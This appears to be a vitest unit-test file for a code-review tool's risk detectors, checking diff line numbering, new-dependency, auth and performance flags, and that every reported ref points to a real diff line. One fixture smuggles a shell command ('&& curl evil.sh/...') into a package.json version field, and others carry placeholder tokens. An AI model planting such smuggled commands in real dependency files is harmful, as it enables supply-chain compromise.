/**
 * Risk Areas detectors — pure unit tests, no DB. Nothing in the repo executed
 * `deriveRisks`, `addedLines`, `toRanges` or `groundRisks` before this file
 * (plan-verifier finding on `docs/plans/0003-intent-card-risk-areas.md`); this
 * is the first real proof for each. Also covers the `new_dependency`
 * secret-leak/fabrication regression fixed in the same iteration (see
 * `server/INSIGHTS.md`, 2026-09-20, "A value-shape allowlist regex must be
 * anchored at BOTH ends").
 */
import { describe, it, expect } from 'vitest';
import { buildLineIndex } from '@devdigest/reviewer-core';
import { parseUnifiedDiff } from '../src/adapters/git/diff-parser.js';
import { addedLines, toRanges } from '../src/modules/reviews/risks/helpers.js';
import { deriveRisks, groundRisks } from '../src/modules/reviews/risks/detectors.js';

const SENTINEL_TOKEN = 'ghp_SENTINEL123';
const SENTINEL_AUTH = 'npm_SENTINEL999';
const SENTINEL_CMD = 'curl evil.sh/SENTINEL';

// ---------------------------------------------------------------------------
// (a) addedLines — new-side line arithmetic
// ---------------------------------------------------------------------------

describe('addedLines', () => {
  const SENTINEL = 'sk_live_SENTINEL';
  const DIFF = [
    'diff --git a/src/config.ts b/src/config.ts',
    '--- a/src/config.ts',
    '+++ b/src/config.ts',
    '@@ -10,3 +10,4 @@ function setup() {',
    '   const a = 1;',
    `+  const key = "${SENTINEL}";`,
    '   const b = 2;',
  ].join('\n');

  it('yields the real new-side line number for a `+` line, counting context lines but not skipping the hunk start', () => {
    const lines = addedLines(DIFF);
    expect(lines).toEqual([
      { path: 'src/config.ts', line: 11, text: `  const key = "${SENTINEL}";` },
    ]);
  });

  it('caps at maxLines', () => {
    const many = [
      'diff --git a/a.ts b/a.ts',
      '+++ b/a.ts',
      '@@ -1,1 +1,5 @@',
      '+a',
      '+b',
      '+c',
      '+d',
    ].join('\n');
    expect(addedLines(many, { maxLines: 2 })).toHaveLength(2);
  });
});

describe('toRanges', () => {
  it('collapses consecutive line numbers into ranges and leaves gaps separate', () => {
    expect(toRanges([12, 13, 14, 20])).toEqual([
      { start: 12, end: 14 },
      { start: 20, end: 20 },
    ]);
  });

  it('de-duplicates and sorts unordered input', () => {
    expect(toRanges([5, 3, 4, 3])).toEqual([{ start: 3, end: 5 }]);
  });
});

// ---------------------------------------------------------------------------
// new_dependency — regression: the fixed secret-leak / fabrication hole
// ---------------------------------------------------------------------------

describe('new_dependency — secret-leak / fabrication regression', () => {
  it('an npm script carrying a credential produces 0 risks and the sentinel appears nowhere in the output', () => {
    const diff = parseUnifiedDiff(
      [
        'diff --git a/package.json b/package.json',
        '--- a/package.json',
        '+++ b/package.json',
        '@@ -2,4 +2,5 @@',
        '  "scripts": {',
        '    "build": "tsc",',
        `+    "deploy": "DEPLOY_TOKEN=${SENTINEL_TOKEN} ./deploy.sh",`,
        '    "test": "vitest run"',
        '  },',
      ].join('\n'),
    );

    const risks = deriveRisks(diff);
    expect(risks).toEqual([]);
    expect(JSON.stringify(risks)).not.toContain(SENTINEL_TOKEN);
  });

  it('an npm registry auth-token line produces 0 risks and the sentinel appears nowhere in the output', () => {
    const diff = parseUnifiedDiff(
      [
        'diff --git a/package.json b/package.json',
        '--- a/package.json',
        '+++ b/package.json',
        '@@ -10,4 +10,5 @@',
        '  "dependencies": {',
        '    "express": "^4.18.0",',
        `+    "//registry.npmjs.org/:_authToken": "${SENTINEL_AUTH}",`,
        '    "lodash": "^4.17.21"',
        '  }',
      ].join('\n'),
    );

    const risks = deriveRisks(diff);
    expect(risks).toEqual([]);
    expect(JSON.stringify(risks)).not.toContain(SENTINEL_AUTH);
  });

  it('a value that only starts semver-range-shaped, then carries a shell command, produces 0 risks (DEP_VALUE_RE is anchored at both ends)', () => {
    const diff = parseUnifiedDiff(
      [
        'diff --git a/package.json b/package.json',
        '--- a/package.json',
        '+++ b/package.json',
        '@@ -10,4 +10,5 @@',
        '  "dependencies": {',
        '    "express": "^4.18.0",',
        `+    "evil-pkg": "^1.0.0 && ${SENTINEL_CMD}",`,
        '    "lodash": "^4.17.21"',
        '  }',
      ].join('\n'),
    );

    const risks = deriveRisks(diff);
    expect(risks).toEqual([]);
    expect(JSON.stringify(risks)).not.toContain('SENTINEL');
  });

  it('a genuine new dependency inside a real dependencies block produces exactly 1 risk with the real new-side line number', () => {
    const diff = parseUnifiedDiff(
      [
        'diff --git a/package.json b/package.json',
        '--- a/package.json',
        '+++ b/package.json',
        '@@ -10,4 +10,5 @@',
        '  "dependencies": {',
        '    "express": "^4.18.0",',
        '+    "ioredis": "^5.4.1",',
        '    "lodash": "^4.17.21"',
        '  }',
      ].join('\n'),
    );

    const risks = deriveRisks(diff);
    expect(risks).toHaveLength(1);
    expect(risks[0]).toMatchObject({
      kind: 'new_dependency',
      title: 'New dependency: ioredis',
    });
    expect(risks[0]!.refs).toHaveLength(1);
    expect(risks[0]!.refs[0]).toMatchObject({ file: 'package.json', start_line: 12, end_line: 12 });
  });

  it('a version bump (removed + added same key) produces 0 risks', () => {
    const diff = parseUnifiedDiff(
      [
        'diff --git a/package.json b/package.json',
        '--- a/package.json',
        '+++ b/package.json',
        '@@ -10,5 +10,5 @@',
        '  "dependencies": {',
        '    "express": "^4.18.0",',
        '-    "ioredis": "^5.3.0",',
        '+    "ioredis": "^5.4.1",',
        '    "lodash": "^4.17.21"',
        '  }',
      ].join('\n'),
    );

    expect(deriveRisks(diff)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// (d) auth_surface — contiguous added block
// ---------------------------------------------------------------------------

describe('auth_surface', () => {
  it('fires one aggregated risk over the contiguous added block of an auth-path file', () => {
    const diff = parseUnifiedDiff(
      [
        'diff --git a/src/middleware/ratelimit.ts b/src/middleware/ratelimit.ts',
        '--- a/src/middleware/ratelimit.ts',
        '+++ b/src/middleware/ratelimit.ts',
        '@@ -1,2 +1,5 @@',
        ' export function rateLimiter(req, res, next) {',
        "+  const token = req.headers['x-api-token'];",
        '+  if (!token) return res.status(401).end();',
        '+  next();',
        ' }',
      ].join('\n'),
    );

    const risks = deriveRisks(diff);
    expect(risks).toHaveLength(1);
    expect(risks[0]).toMatchObject({ kind: 'auth_surface', title: 'Auth surface touched', severity: 'high' });
    expect(risks[0]!.refs).toEqual([
      { file: 'src/middleware/ratelimit.ts', start_line: 2, end_line: 4 },
    ]);
  });
});

// ---------------------------------------------------------------------------
// (e) performance — request-path file only
// ---------------------------------------------------------------------------

describe('performance', () => {
  it('fires for a Redis call added in a request-path file, but NOT for the identical line in scripts/seed.ts', () => {
    const diff = parseUnifiedDiff(
      [
        'diff --git a/src/routes/orders.ts b/src/routes/orders.ts',
        '--- a/src/routes/orders.ts',
        '+++ b/src/routes/orders.ts',
        '@@ -1,2 +1,3 @@',
        ' export async function getOrders(req, res) {',
        '+  const cache = new Redis(process.env.REDIS_URL);',
        ' }',
        'diff --git a/scripts/seed.ts b/scripts/seed.ts',
        '--- a/scripts/seed.ts',
        '+++ b/scripts/seed.ts',
        '@@ -1,2 +1,3 @@',
        ' async function seed() {',
        '+  const cache = new Redis(process.env.REDIS_URL);',
        ' }',
      ].join('\n'),
    );

    const risks = deriveRisks(diff);
    const perf = risks.filter((r) => r.kind === 'performance');
    expect(perf).toHaveLength(1);
    expect(perf[0]).toMatchObject({ title: 'Adds Redis round-trip per request' });
    expect(perf[0]!.refs).toEqual([{ file: 'src/routes/orders.ts', start_line: 2, end_line: 2 }]);
    expect(risks.some((r) => r.refs.some((ref) => ref.file === 'scripts/seed.ts'))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// (f) empty / truncated diff
// ---------------------------------------------------------------------------

describe('empty / truncated diff', () => {
  it('an empty diff yields risks: []', () => {
    expect(deriveRisks(parseUnifiedDiff(''))).toEqual([]);
  });

  it('a file marker with no hunk (truncated patch) yields risks: []', () => {
    const diff = parseUnifiedDiff('diff --git a/a.ts b/a.ts\n+++ b/a.ts\n');
    expect(deriveRisks(diff)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// (g) grounding guarantee — every ref of every risk is a real diff line
// ---------------------------------------------------------------------------

describe('groundRisks / deriveRisks — grounding guarantee', () => {
  it('every ref of every risk satisfies buildLineIndex(diff).get(ref.file)!.has(ref.start_line) and .has(ref.end_line)', () => {
    const diff = parseUnifiedDiff(
      [
        'diff --git a/src/middleware/ratelimit.ts b/src/middleware/ratelimit.ts',
        '--- a/src/middleware/ratelimit.ts',
        '+++ b/src/middleware/ratelimit.ts',
        '@@ -1,2 +1,5 @@',
        ' export function rateLimiter(req, res, next) {',
        "+  const token = req.headers['x-api-token'];",
        '+  if (!token) return res.status(401).end();',
        '+  next();',
        ' }',
        'diff --git a/package.json b/package.json',
        '--- a/package.json',
        '+++ b/package.json',
        '@@ -10,4 +10,5 @@',
        '  "dependencies": {',
        '    "express": "^4.18.0",',
        '+    "ioredis": "^5.4.1",',
        '    "lodash": "^4.17.21"',
        '  }',
        'diff --git a/src/routes/orders.ts b/src/routes/orders.ts',
        '--- a/src/routes/orders.ts',
        '+++ b/src/routes/orders.ts',
        '@@ -1,2 +1,3 @@',
        ' export async function getOrders(req, res) {',
        '+  const cache = new Redis(process.env.REDIS_URL);',
        ' }',
      ].join('\n'),
    );

    const risks = deriveRisks(diff);
    expect(risks.length).toBeGreaterThan(0); // the guarantee is only meaningful if there is something to check

    const lineIndex = buildLineIndex(diff);
    for (const risk of risks) {
      expect(risk.refs.length).toBeGreaterThan(0);
      for (const ref of risk.refs) {
        const lines = lineIndex.get(ref.file);
        expect(lines).toBeDefined();
        expect(lines!.has(ref.start_line)).toBe(true);
        expect(lines!.has(ref.end_line)).toBe(true);
      }
    }
  });

  it('groundRisks drops a ref that does not intersect a real hunk, and drops the risk entirely once it has no refs left', () => {
    const diff = parseUnifiedDiff(
      [
        'diff --git a/src/middleware/ratelimit.ts b/src/middleware/ratelimit.ts',
        '--- a/src/middleware/ratelimit.ts',
        '+++ b/src/middleware/ratelimit.ts',
        '@@ -1,2 +1,3 @@',
        ' export function rateLimiter(req, res, next) {',
        '+  next();',
        ' }',
      ].join('\n'),
    );

    const ungroundedOnly = groundRisks(
      [
        {
          kind: 'auth_surface',
          title: 'Auth surface touched',
          explanation: 'fabricated ref, out of range',
          severity: 'high',
          refs: [{ file: 'src/middleware/ratelimit.ts', start_line: 999, end_line: 999 }],
        },
      ],
      diff,
    );
    expect(ungroundedOnly).toEqual([]);

    const mixed = groundRisks(
      [
        {
          kind: 'auth_surface',
          title: 'Auth surface touched',
          explanation: 'one real ref, one fabricated',
          severity: 'high',
          refs: [
            { file: 'src/middleware/ratelimit.ts', start_line: 2, end_line: 2 },
            { file: 'src/middleware/ratelimit.ts', start_line: 999, end_line: 999 },
          ],
        },
      ],
      diff,
    );
    expect(mixed).toHaveLength(1);
    expect(mixed[0]!.refs).toEqual([{ file: 'src/middleware/ratelimit.ts', start_line: 2, end_line: 2 }]);
  });
});
